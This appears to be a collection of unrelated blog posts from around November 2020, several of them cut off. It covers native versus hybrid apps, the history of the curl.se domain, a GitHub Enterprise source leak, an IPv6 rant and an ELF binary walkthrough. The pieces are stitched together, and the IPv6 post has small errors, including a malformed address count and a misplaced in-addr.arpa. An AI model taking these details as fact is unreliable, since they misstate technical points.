<p>After all that’s said, it’s pretty obvious that native would win this category. Native apps are faster and more seamless in the sense that when a user navigates through the app, all its contents, visuals and structure readily fit on their device.</p>
<p>As for hybrid, content and data are loaded from the server. How might this affect performance? When servers are taken into account, we need to consider the number of requests being made to a server, or, how many people are trying to reach that server. The higher the traffic, the slower the performance of your app.&nbsp;</p>
<h3><strong>App Updates</strong></h3>
<p>When it comes to tech and product development, there’s no such thing as bug-free software that never needs updates. Development teams will always find room for improvement. So the difference lies in the frequency of your updates and what actions are required from your users to acquire the updates. This will all have an impact on how well your app is received.</p>
<p>Hybrid apps don't require users to update through app stores. Once the update is applied on the page that is loaded from the server, users who navigate through the app can instantly see the update.</p>
<p>Native app users, on the other hand, will need to go through the app stores for updates before they see the changes. This won’t be any extra work for those who have automatic updates enabled on their devices, but what about those who don’t? Will frequent updates frustrate them and affect their perception of your app? This will be something for you to consider.</p>
<h2><strong>Next Step For You</strong></h2>
<p>When it comes to deciding which technology to build your application on, both native and hybrid have their respective advantages and disadvantages. What you need to do is weigh the pros and cons, and decide what risks you’re willing or unwilling to take. If your business is on a tight deadline and going hybrid is your only option, just be aware of the tradeoffs that you are putting on the line.&nbsp;</p>
<p>Essentially, it’s no question that native apps make a bigger impact in the long run. Your initial investment will definitely be higher, but the end result of better user experience and performance might be worth taking the leap for.&nbsp;</p>

<p>Good things come to those who wait?</p>



<p>When I created and started hosting the first websites for curl I didn’t care about the URL or domain names used for them, but after a few years I started to think that maybe it would be cool to register a curl domain for its home. By then it was too late to find an available name under a “sensible” top-level domain and since then I’ve been on the lookout for one.</p>



<h2>Yeah, I host it</h2>



<p>So yes, I’ve administrated every machine that has ever hosted the curl web site going all the way back to the time before we called the tool curl. I’m also doing most of the edits and polish of the web content, even though I’m crap at web stuff like CSS and design. So yeah, I consider it my job to care for the site and make sure it runs smooth and that it has a proper (domain) name.</p>



<h2>www.fts.frontec.se</h2>



<p>The first ever curl web page was hosted on “<code>www.fts.frontec.se/~dast/curl</code>” in the late 1990s (<a href="https://web.archive.org/web/19981202234521/http://www.fts.frontec.se/%7Edast/curl/">snapshot</a>). I worked for the company with that domain name at the time and ~dast was the location for my own personal web content.</p>



<h2>curl.haxx.nu</h2>



<p>The curl website moved to its first “own home”, with curl.haxx.nu in August 1999 (<a href="https://web.archive.org/web/19991013093821/http://curl.haxx.nu/">snapshot</a>) when we registered our first domain and the .nu top-level domain was available to us when .se wasn’t.</p>



<h2>curl.haxx.se</h2>



<p>We switched from curl.haxx.nu to curl.haxx.se in the summer of 2000 (when finally were allowed to register our name in the .se TLD) (<a href="https://web.archive.org/web/20001017164421/https://curl.haxx.se/">snapshot</a>).</p>



<p>The name “haxx” in the domain has been the reason for many discussions and occasional concerns from users and overzealous blocking-scripts over the years. I’ve kept the curl site on that domain since it is the name of one of the primary <a href="https://curl.haxx.se/sponsors.html">curl sponsors</a> and partly because I want to teach the world that a particular word in a domain is not a marker for badness or something like that. And of course because we have not bought or been provided a better alternative.</p>



<p><a href="https://www.haxx.se/">Haxx</a> is still the name of the company I co-founded back in 1997 so I’m also the admin of the domain.</p>



<h2>curl.se</h2>



<p>I’ve looked for and contacted owners of curl under many different TLDs over the years but most have never responded and none has been open for giving up their domains. I’ve always had an extra attention put on <code>curl.se</code> because it is in the Swedish TLD, the same one we have for Haxx and where I live.</p>



<h2>The curling background</h2>



<p>The first record on archive.org of anyone using the domain <code>curl.se</code> for web content is dated <a href="https://web.archive.org/web/20030830002347/http://www.curl.se/">August 2003</a> when the Swedish curling team “Härnösands CK” used it. They used the domain and website for a few years under this name. It can be noted that it was team <a href="https://en.wikipedia.org/wiki/Anette_Norberg">Anette Norberg</a>, which subsequently won two Olympic gold medals in the sport.</p>



<p>In September 2007 the site was renamed, still being about the sport curling but with the name “the curling girls” in Swedish (<em>curlingtjejerna</em>) which remained there for just 1.5 years until it changed again. “curling team Folksam” then populated the site with contents about the sport and that team until they let the domain expire in 2012. (Out of these three different curling oriented sites, the first one is the only one that still seems to be around but now of course on another domain.)</p>



<h2>Ads</h2>



<p>In early August 2012 the domain was registered to a new owner. I can’t remember why, but I missed the chance to get the domain then.</p>



<p>August 28 2012 marks the first date when curl.se is recorded to suddenly host a bunch of links to casino, bingo and gambling sites. It seems that whoever bought the domain wanted to surf on the good name and possible incoming links built up from the previous owners. For several years this crap was what the website showed. I doubt very many users ever were charmed by the content nor clicked on many links. It was ugly and over-packed with no real content but links and ads.</p>



<p>The last archive.org capture of the ad-filled site was done on October 2nd 2016. Since then, there’s been no web content on the domain that I’ve found. But the domain registration kept getting renewed.</p>



<h2>Failed to purchase</h2>



<p>In August 2019, I noticed that the domain was about to expire, and I figured it could be a sign that the owner was not too interested in keeping it anymore. I contacted the owner via a registrar and offered to buy it. The single only response I ever got was that my monetary offer was “too low”. I tried to up my bid, but I never got any further responses from the owner and then after a while I noticed that the domain registration was again renewed for another year. I went back to waiting.</p>



<h2>Expired again</h2>



<p>In September 2020 the domain was again up for expiration and I contacted the owner again, this time asking for a price for which they would be willing to sell the domain. Again no response, but this time the domain actually went all the way to expiry and deletion, which eventually made it available “on the market” for everyone interested to compete for the purchase.</p>



<p>I entered the race with the help of a registrar that would attempt to buy the name when it got released. When this happens, when a domain name is “released”, it becomes a race between all the potential buyers who want the domain. It is a 4-letter domain that is an English word and easy pronounceable. I knew there was a big risk others would also be trying to get it.</p>



<p>In the early morning of October 19th 2020, the curl.se domain was released and in the race of getting the purchase… I lost. Someone else got the domain before me. I was sad. For a while, until I got the good news…</p>



<h2>Donated!</h2>



<p>It turned out my friend <strong>Bartek Tatkowski</strong> had snatched the domain! After getting all the administrative things in order, Bartek graciously donated the domain to me and 15:00 on October 30 2020 I could enter my own name servers into the dedicated inputs fields for the domain, and configure it properly in our master and secondary DNS servers.</p>



<h2>curl.se is the new home</h2>



<p>Starting on November 4, 2020 <strong>curl.se is the new official home</strong> site for the curl project. The <code>curl.haxx.se</code> name will of course remain working for a long time more and I figure we can basically never shut it down as there are so many references to it spread out over the world. I intend to eventually provide redirects for most things from the old name to the new.</p>



<div><figure><a href="https://www.fastly.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-1200x630.png" alt="" width="190" height="100" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-200x105.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-450x236.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-768x403.png 768w" sizes="(max-width: 190px) 100vw, 190px"></a></figure></div>



<p>What about a www prefix? The jury is still out how or if we should use that or not. The initial update of the site (November 4) uses a www.curl.se host name in links but I’ve not done any automatic redirects to or from that. As the site is CDNed, and we can’t use CNAMEs on the apex domain (curl.se), we instead use anycast IPs for it – the net difference to users should be zero. (Fastly is a generous sponsor of the curl project.)</p>



<p>I also happen to own <code>libcurl.se</code> since a few years back and I’ll make sure using this name also takes you to the right place.</p>



<h2>Why not curl.dev?</h2>



<p>People repeatedly ask me. Names in the .dev domains are <em>expensive</em>. Registering <code>curl.dev</code> goes for 400 USD right now. <code>curl.se</code> costs 10 USD/year. I see little to no reason to participate in that business and I don’t think spending donated money on such a venture is a responsible use of our funds.</p>

		<p>What do Microsoft <i>really</i> think about open-source?</p>

		<p><strong>Update</strong>: according to multiple online sources, the leaked source code was from GitHub <em>Enterprise</em>, not the version hosted at <a href="http://github.com/">GitHub.com</a>. While a substantial amount of code is shared between the two, they do have some differences.</p>
<p>The entirety of the confidential source code used by GitHub Enterprise has just been leaked to the public.</p>
<p>In a suspicious <a href="https://web.archive.org/web/20201104050026if_/https://github.com/github/dmca/tree/565ece486c7c1652754d7b6d2b5ed9cb4097f9d5">commit</a> to the <a href="https://github.com/github/dmca">official GitHub DMCA repository</a>, an unknown individual uploaded the confidential source code, impersonating Nat Friedman using a bug in GitHub's application.</p>
<p>At the heart of open-source, GitHub has long been criticised for keeping its source code private. The platform hosts millions of open-source projects, and critics say GitHub's position is somewhat hypocritical.</p>
<p>However, this raises questions around the security of GitHub's source code, and whether or not GitHub have anything to lose, if they do plan to release the source code in a public setting.</p>
<p>Some worry this will damage the overall security of GitHub, and this may be true. Commonly, closed-source applications perform "security by obscurity". This means the source code is hidden, with the intention of concealing security risks.</p>
<p>Since Microsoft's <a href="https://www.theverge.com/2018/10/26/17954714/microsoft-github-deal-acquisition-complete">acquisition of GitHub</a> in 2018, Microsoft have repeatedly emphasised their "love" for open-source. We have seen this through repeated commercial advertisements, which aim to place Microsoft at the forefront of open-source development.</p>
<p>Some users, such as Drew DeVault, suggest Microsoft is attempting to <a href="https://drewdevault.com/2020/08/27/Microsoft-plays-their-hand.html">centralise open-source</a>. Through closed-source applications, and proprietary extensions to Git, GitHub is seen as a platform that tries to <em>contain</em> open-source. An example of this is when <a href="https://www.theverge.com/2020/6/29/21306674/github-down-errors-outage-june-2020">GitHub went offline for two hours</a>, leaving thousands of open-source projects inaccessible and unusable.</p>
<p>GitHub is, in many ways, the Google of open-source development.</p>
<p>Perhaps GitHub as 12 years late in finally revealing their source code to the public; and maybe this is just what we need. <a href="https://mastodon.tedomum.net/@resynth1943">What do you think?</a></p>

November 4, 2020 | https://teknikaldomain.me/post/ipv6-is-a-total-nightmare/ | <a href="https://web.archive.org/web/*/https://teknikaldomain.me/post/ipv6-is-a-total-nightmare/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<div>


<p>So this is just going to be a total rant.
IPv6 is, in theory, a solution to many things, including the dwindling IPv4 address space.
IPv6 was a draft in 1997(!), and became a real <em>Internet Standard</em> in 2017.
And, quite frankly, it’s one of those things that just adds too much hassle for not enough benefit.</p>

<p>Okay, yes, IPv6’s address space is <em><strong>massive.</strong></em>
IPv4 uses 32-bit addresses, allowing for 4,294,967,296 total addresses.
IPv6 uses 128-bit addresses, meaning… 340,282,366,920,938,463,463,374,607,431,768,211,456 addresses.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>
The entire v4 space could fit into the v6 space $7.922816251426434 \times 10^{28}$ times over.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>
The default allocation to people, a <code>/64</code>, meaning the first half of the addresses is fixed and the entire second half is the part unique to the network, means that most people have 18,446,744,073,709,551,616 addresses to play with at home.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>
Compared to v4, where <em>most</em> networks are around <code>/24</code>, meaning the first three groupings are fixed, you get… 254 addresses.
Again, context, a standard <code>/64</code> allocation can, <em>again</em>, fit the entire v4 address space inside itself 4,294,967,296 times. (Yes, that’s the number of addresses <em>in</em> the IPv4 address space. That’s what happens when you divide a power by half of that power.)</p>
<p>IPv4 addresses are, well, sparse, given that most high-level authorities have already run out of addresses, but because CIDR and NAT are a thing, we’ve really started compacting down our usage.
<em>My entire house</em> of easily over 60 IPs takes up… 2, according to the rest of the world.</p>
<h2 id="allocation-issues">Allocation Issues</h2>
<p>One thing that people have criticized IPv4 for is that the allocations are just horrible.
For example, <em>anything</em> starting with <code>127</code> is <code>localhost</code>.
normally this is <code>127.0.0.1</code>, but anything from <code>127.0.0.0</code> to <code>127.255.255.255</code> all mean the <strong>exact same thing.</strong>
That’s 16,777,216 addresses all <em>literally for <code>localhost</code>.</em>
By numbers, 0.39% of the address space, but just keep this in mind.</p>
<p>Similarly, anything starting with a <code>0</code>, is effectively “current network” (only valid as source), again, another 16 million addresses.</p>
<p>There’s also multiple blocks for private networks, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>.
In total, 17,891,328 addresses.</p>
<p>Compared to IPv6, yes, IPv6 is much better… in theory.
There’s only <em>one</em> loopback address, <code>::1</code>.
At the same time… <code>fc00::/7</code> (26,58,455,991,569,831,745,807,614,120,560,689,152 addresses) is the private address space (more on that later), <code>fe80::/10</code> (332,306,998,946,228,968,225,951,765,070,086,144 addresses) is the <em>local</em> address space, and <code>ff00::/8</code> (1,329,227,995,784,915,872,903,807,060,280,344,576 addresses.) is multicast.
yes, do you see a recurring pattern?
Even though the entire “special” address assignments are exactly 1.271% of the entire IPv6 address space, we’re still allocating <strong>giant</strong> swathes of addresses.
History repeats itself, you can see that <em>right here.</em></p>
<p>And I will admit, that multicast in IPv6 is special since some bits in the address are special flags, and one form of multicast actually includes a response node’s address, so it’s not <em>just</em> an arbitrary number, but… come on, that’s a little uncalled for, having <em>that much</em> space.</p>

<p>We all know what an IPv4 address looks like, right?
Four dotted-decimal grouping in the range from 0–255.
For example, <code>192.168.5.225</code>.
IPv6 uses <em>eight</em> groupings of four <em>hex</em> digits, colon-separated.
For example, <code>2607:f0d0:1002:0051:0000:0000:0000:0004</code>.
That’s… very unweildy, so we have a few shortening rules.
Any zeros that <em>lead</em> the droup can be dropped, giving us this: <code>2607:f0d0:1002:51:0:0:0:4</code>.
And since <em>that</em> is still repetitive, you can replace <em>exactly one</em> sequence of <em>more than one group</em> of all zeros with an empty: <code>2607:f0d0:1002:51::4</code>.
For the record this is why the loopback address is <code>::1</code>.
The full address is <code>0000:0000:0000:0000:0000:0000:0000:0001</code>.
Even with those methods, they’re still <em>much</em> longer, harder to remember, and harder to even say than IPv4 addresses.</p>
<h2 id="urls">URLs</h2>
<p>And remember that this address violates the URL spec, since the <code>:</code> character is specifically to be used to separate the <em>host</em> portion (e.g., <code>google.com</code>) from the <em>port</em> to connect to (assuming nonstandard).
As an example, I can reach my torrent client via <code>http://192.168.5.43:9091</code>.
See that <code>:</code> there?
Because Transmission listens on port 9091, not port 80.
How do we fix this?
Well, by breaking it again, naturally.
To connect to a raw IPv6 address, you wrap it in square brackets.
To connect to <code>2607:f0d0:1002:51::4</code> directly, that’s <code>http://[2607:f0d0:1002:51::4]/</code>
<strong>Why is this a thing?!</strong>.</p>
<h2 id="dns">DNS</h2>
<p>okay, admittedly, IPv6 kinda relies on DNS since… just about everything uses DNS, and of course, actual names are more memorable than 32 hexadecimal digits, but DNS isn’t magic.
Unless you have your own DNS server (actually not that hard) that’s configured, you’re still manually typing addresses.
Of course if you have, say, pfSense managing your network, every static DHCP lease will be registered in DNS, but it has to take a DHCP lease.
And if this device doesn’t… well, I hope you don’t mind typing that out by hand to connect so you can configure it.</p>
<p>Even better, rDNS.
rDNS, or Reverse DNS, is where a DNS query is performed <em>with an IP address</em> that returns the hostname associated, in a <code>PTR</code> record.
For example, the IPv4 that <code>google.com</code> resolves to, <code>216.58.192.142</code>, can be queried as <code>142.192.58.216.in-addr.arpa</code> to get it’s “real” name, a <code>PTR</code> record for <code>ord36s01-in-f142.1e100.net</code>.
With <code>dig</code>, specifying a <code>-x</code> and then the IP will convert it to the correct format.
And if you look close, the query name is the IP, backwards, with <code>in-addr.arpa</code> at the front.
It’s backwards because of the hierarchical nature of DNS, which runs right to left, the opposite of IPs.
Of course, there’s also rDNS for IPv6:</p>

<p>One of the core pillars of IPv6 is that most of the processing of traffic should happen at the endpoints — routers don’t do much besides read, and forward, with very little actual data processing.
The IPv6 header while being <em>gargantuan</em> in comparison (because the giant addresses), is also much simpler.
A fixed version code (6), the traffic class (<abbr title="Differentiated Services">DiffServ</abbr>
+ <abbr title="Explicit Congestion Notification">ECN</abbr>
), a <em>flow label</em> which is effectively a random value that’s constant for every packet that’s part of the same logical connection, length, type of next header, and a TTL (then addresses, obviously).
That is <em>it</em>.
The IPv4 header contains 13 fields plus optional sections, and the IPv6 header contains a flat 8.
Of course, you may actually need other details, and that’s where the <em>next header</em> field comes in.
Instead of packing all sorts of options into the standard, global header, IPv6 uses additional header <em>extensions</em> that can get tacked on one after another to provide that information, say for fragmentation or IPsec.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>
The value in the next header field identifies what’s going to come next, and the final header in the line will use this field to indicate the contained protocol, be it TCP, UDP, or something else.</p>
<p>Also note there’s no checksum anymore.
I mean, just about every device uses Ethernet, which has a Frame Check Sequence (FCS), UDP has a checksum option, TCP has a required checksum…
If we want to simply packet processing, drop the sum.
And really, it does make sense, in a way.
Even without that one, that means that most programs have two checksums: the Ethernet FCS as the frame gets transmitted point to point, and the transport layer checksum, making sure the entire packet is still valid.
Also, the IPv4 checksum also included the TTL (max number of hops in the path before the packet is dropped), meaning that at <em>every stop</em> along the way, the checksum had to be recalculated.</p>
<p>As a final point, this also does bring a change to another protocol: UDP.
With IPv4, the UDP checksum field can (and often would) be left blank as all zeros, meaning “no checksum”.
In IPv6, this is now disallowed, and a all zero checksum will still be checked… and then found invalid.
All UDP packets over IPv6 <em>must</em> have a valid checksum calculated.</p>

<p>So every link between devices has an MTU, the Maximum Transmission Unit.
For normal Ethernet links, minus the frame overhead, this is 1500 bytes.
If your equipment supports jumbo frames, that’s closer to 9000 bytes.
Well not all links are equal.
Some devices might have a high-MTU link on one end, and a lower MTU link on the other.
For example, my router might support jumbo frames internally, but the WAN side doesn’t allow that.
To deal with, this, we have <em>fragmentation</em>.</p>
<p>If a router is unable to forward a frame due to MTU differences, it will, if allowed, split the packet into multiple chunks, using the More Fragments flag and the Fragment Offset field of the IPv4 header, and send the packet in multiple frames piece by piece, which the other end can reassemble.
Note that I said “if allowed.”
There is a Don’t Fragment flag in the IPv4 header, and if this is set by the sending device, a router that cannot support a packet of that size will send back an <abbr title="Internet Control Message Protocol">ICMP</abbr>
“packet too big” message which bounces back along the chain.
Any node in the network path can perform this, meaning that for sending data, the only MTU you care about is the MTU of the device you’re directly connected …</p></div></article></div>

                <h3>Anatomy of a Binary Executable</h3>
                
                    <p><em></em>
                        <span>Wed, Nov 4, 2020</span>

                    </p>
                
            </div>

            <p>Even though I’ve developed software for a number of years now, there’s one question that has always been in the back of my mind and I haven’t had the time or patience to really answer, until now: <strong>What <em>is</em> a binary executable anyways?</strong></p>
<p>For this example, I wrote a brutally simple Rust program that includes a function “<code>sum</code>” to add two integers together, and am invoking it from <code>main()</code>:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    println<span>!</span>(<span>"{}"</span>, sum(<span>5</span>, <span>8</span>));
}

<span>pub</span> <span>fn</span> <span>sum</span>(a: <span>i32</span>, b: <span>i32</span>) -&gt; <span>i32</span> {
    a <span>+</span> b
}
</code></pre></div><p>My Rust code is always structured the <a href="https://doc.rust-lang.org/cargo/guide/project-layout.html">“cargo way”</a>, so I can compile my program by running <code>cargo build</code>, and this will produce a binary for me within the <code>target/debug/</code> directory. I have named my crate <code>rbin</code>, so this is the name of the binary that is created at this location:</p>
<div><pre><code data-lang="bash">~$ cargo build
   Compiling rbin v0.1.0 <span>(</span>/home/mierdin/Code/rbin<span>)</span>
    Finished dev <span>[</span>unoptimized + debuginfo<span>]</span> target<span>(</span>s<span>)</span> in 0.15s

~$ ls -lha target/debug/rbin
-rwxrwxr-x <span>2</span> mierdin mierdin 3.1M Nov  <span>3</span> 22:46 target/debug/rbin
</code></pre></div><p>These days, it’s really easy to take such questions for granted, but if you’re curious, you may be asking:</p>
<blockquote>
<p>“But what <strong>is</strong> that file?”</p>
</blockquote>
<p>I mean we all generally know that it’s an “executable”, in that we run it and our program happens. But what does that mean? What is contained in that file that means our computer automatically just <strong>knows</strong> how to run it? And how is it possible that a program with 7 lines of code can take up over 3 megabytes of disk space?!?</p>
<p>It turns out that in order to create an executable for this ridiculously simple program, the Rust compiler must include quite a bit of additional software to make it possible.</p>

<p>Well, it turns out there is a widely accepted format for these things, called the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">“Executable and Linkable Format”</a>, or ELF!</p>
<blockquote>
<p>Note that I won’t be comprehensively covering ELF here (there are plenty of other resources, many of which I’ll link to) - rather this is an exploration of what goes into a Rust binary with the simplest, default settings, and some observations about what seems interesting to me.</p>
</blockquote>
<p>ELF is a well-known, popular format, especially in the world of Linux, but there are plenty of others. <a href="https://en.wikipedia.org/wiki/Comparison_of_executable_file_formats">Operating systems like Windows and macOS each have their own format</a>, which is a big reason why, when you’re compiling (or simply downloading) software, you have to specify the operating system you want to run it on. This is true despite the fact that the underlying machine code that executes your program may be the same on all of them (e.g. <code>x86_64</code>).</p>
<p>An <strong>exceptional</strong> visual breaking down the ELF format can be found at the link to the ELF wikipedia page above, I have found myself constantly referring back to it while writing this post:</p>

</p>
<p>Commonly, executable formats like this specify a <a href="https://en.wikipedia.org/wiki/File_format#Magic_number">magic number</a> right at the beginning of the file, so that the format can be easily identified. This occupies the first four bytes in the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#File_header">file header</a>. This is a very important field, because unless we can first identify an ELF file appropriately, we can’t reasonably expect to do anything “ELF-y” with it. We know where certain bits of information <strong>should</strong> be in an ELF file, but we first must identify using these bytes that this is what we can expect.</p>
<p>The <code>readelf</code> utility is extremely useful for printing all kinds of useful metadata and related tables of information contained within an ELF file. However, this utility expects - naturally - that the file being read is actually an ELF file, and even provides a helpful hint that the expected “magic bytes” for a non-ELF file aren’t set appropriately when used on a non-ELF file, so it doesn’t attempt to read the rest:</p>
<div><pre><code data-lang="bash">~$ readelf -l .gitignore

readelf: Error: Not an ELF file - it has the wrong magic bytes at the start
</code></pre></div><p>Once identified, the entire rest of the file can be identified using <strong>byte offsets</strong> (that is, the number of bytes from zero).</p>
<blockquote>
<p>For those that are accustomed to looking at network packet captures, this should all sound very familiar to you, as this is exactly how we know where certain fields are located in a packet header. <a href="https://en.wikipedia.org/wiki/Ethernet_frame">Ethernet frames</a> have a predictable preamble and start-of-frame delimiter. Ethernet also has a field called the “Ethertype”, which provides a clue as to what protocol is contained within the Ethernet frame (which allows computers to then parse those field as well). Just like Ethernet has a standard set of byte offsets that indicate where the various fields should be represented, the ELF format specifies its own offsets for all of the fields providing useful identifying and execution information in the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#File_header">file header</a>, which then point to other important locations within the file.</p>
</blockquote>
<p>There’s all kinds of useful information in this header, but in particular, the <code>e_entry</code> field  in the file header points to the offset location from where the execution should start. This is the “entry point” for the program. We’ll definitely be following this down the rabbit hole in a little bit.</p>
<p>We can again use <code>readelf</code>, this time on a proper ELF file (our Rust program), and also using the <code>-h</code> flag to show the file header:</p>
<div><pre><code data-lang="bash">~$ readelf -h target/debug/rbin

ELF Header:
  Magic:   7f <span>45</span> 4c <span>46</span> <span>02</span> <span>01</span> <span>01</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> 
  Class:                             ELF64

  ABI Version:                       <span>0</span>
  Type:                              DYN <span>(</span>Shared object file<span>)</span>
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x5070
  Start of program headers:          <span>64</span> <span>(</span>bytes into file<span>)</span>
  Start of section headers:          <span>3195368</span> <span>(</span>bytes into file<span>)</span>
  Flags:                             0x0
  Size of this header:               <span>64</span> <span>(</span>bytes<span>)</span>
  Size of program headers:           <span>56</span> <span>(</span>bytes<span>)</span>
  Number of program headers:         <span>12</span>
  Size of section headers:           <span>64</span> <span>(</span>bytes<span>)</span>
  Number of section headers:         <span>42</span>
  Section header string table index: <span>41</span>
</code></pre></div><p>So, the “magic number” lets us parse at least the rest of the file header, which contains not only information about the file, but byte-offset locations for other important portions of the file. One of these is the “Start of program headers”, which starts after 64 bytes.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Program_header">program header table</a> contains information that allows the operating system to allocate memory and load the program. This is also referred to as a <a href="http://www.tldp.org/LDP/LG/issue23/flower/psimage.html">process image</a>. You can think of it as a list of “instructions” that tell the system to do various things with chunks of memory in order to prepare to execute this program.</p>
<p>The <code>readelf</code> utility also allows us to read the program headers using the <code>-l</code> flag:</p>
<div><pre><code data-lang="bash">~$ readelf -l target/debug/rbin

Elf file type is DYN <span>(</span>Shared object file<span>)</span>
